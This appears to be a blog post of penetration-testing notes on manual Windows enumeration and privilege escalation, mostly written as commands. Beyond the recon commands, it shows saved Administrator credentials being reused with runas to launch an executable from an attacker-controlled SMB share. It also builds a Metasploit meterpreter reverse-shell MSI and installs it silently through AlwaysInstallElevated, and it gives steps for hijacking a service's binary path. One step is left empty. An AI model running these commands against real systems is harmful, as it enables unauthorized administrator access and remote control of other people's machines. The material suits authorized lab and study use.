---
layout: post
title: Windows Manual Enumeration
description: Windows Manual Enumeration
date: 2022-04-09
---

### System Info
```
systeminfo 
```
### Extract patches and updates
```
wmic qfe
wmic qfe get Caption, Description, HotFixID, InstalledOn
```
### List all drives
```
wmic logicaldisk get caption,description,providername
```

### User Info
```
whoami /priv
```
### Find user accounts
```
net user [USER]
```
### Find users in group
```
net localgroup administrators
```

### Network Info
```
ipconfig /all
arp -a
netstat -ano
```

### Running services
```
services (by itself)
sc queryex type= service
Get-Service <foo> (Powershell)
Start-Service <foo> (Powershell)
```

### list credentials inside Credential Manager 
```
C:\Windows\System32\spool\drivers\color>cmdkey /list

Currently stored credentials:

    Target: Domain:interactive=ACCESS\Administrator
                                                       Type: Domain Password
    User: ACCESS\Administrator
    
C:\Windows\System32\spool\drivers\color>runas /savecred /user:ACCESS\Administrator "\\10.10.14.33\EVILSMB\kittens.exe"
```

### AlwaysInstallElevated
Detection

1.Open command prompt and type: reg query HKLM\Software\Policies\Microsoft\Windows\Installer
2.From the output, notice that “AlwaysInstallElevated” value is 1.
3.In command prompt type: reg query HKCU\Software\Policies\Microsoft\Windows\Installer
4.From the output, notice that “AlwaysInstallElevated” value is 1.

Exploitation

Kali VM

1. Open command prompt and type: msfconsole
2. In Metasploit (msf > prompt) type: use multi/handler
3. In Metasploit (msf > prompt) type: set payload windows/meterpreter/reverse_tcp
4. In Metasploit (msf > prompt) type: set lhost [Kali VM IP Address]
5. In Metasploit (msf > prompt) type: run
6. Open an additional command prompt and type: msfvenom -p windows/meterpreter/reverse_tcp lhost=[Kali VM IP Address] -f msi -o setup.msi
7. Copy the generated file, setup.msi, to the Windows VM.

Windows VM

1.Place ‘setup.msi’ in ‘C:\Temp’.
2.Open command prompt and type: msiexec /quiet /qn /i C:\Temp\setup.msi

Enjoy your shell! :)

- Alternatively, once you have a meterpreter shell, you can use 'exploit/windows/local/always_install_elevated' for your session

### Weak service permissions
- https://medium.com/@asfiyashaikh10/windows-privesc-weak-service-permission-b90f3bf4d44f
- https://pentestlab.blog/2017/03/30/weak-service-permissions/

### Check Startup Items for weak file perms
```
1. Open command prompt and type:  
2. From the output notice that the “BUILTIN\Users” group has full access ‘(F)’ to the directory.
```

### Check for services we can control
```
accesschk.exe -uwcv Everyone *
```

### Modify binary path
```
sc config <service name> binPath= <binary path>
sc qc <service name>
```
